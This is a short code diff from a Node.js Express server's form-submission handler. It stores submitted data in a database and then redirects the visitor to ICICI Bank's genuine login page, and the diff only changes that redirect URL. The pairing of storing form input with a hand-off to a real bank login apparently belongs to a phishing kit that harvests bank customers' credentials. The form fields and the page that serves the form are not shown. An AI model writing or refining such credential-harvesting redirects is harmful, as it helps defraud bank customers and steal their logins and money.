@@ -86,7 +86,7 @@ app.post('/submit', upload.none(), (req, res) => {
             }
 
             console.log(`Data inserted with ID: ${this.lastID}`);
-            res.redirect('https://infinity.icicibank.com/?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=ICI&ITM=nli_personalb_personal_login_btn&_gl=1*11w9uul*_ga*MTk4ODY0MjIyNC4xNjA5MjM2MjAy*_ga_SFRXTKFEML*MTYwOTI0MTA0NC4yLjAuMTYwOTI0MTA0NC42MA..'); // Redirect the user after successful submission
+            res.redirect('https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=ICI&ITM=nli_personalb_personal_login_btn&_gl=1*11w9uul*_ga*MTk4ODY0MjIyNC4xNjA5MjM2MjAy*_ga_SFRXTKFEML*MTYwOTI0MTA0NC4yLjAuMTYwOTI0MTA0NC42MA..'); // Redirect the user after successful submission
         }
     );
 });
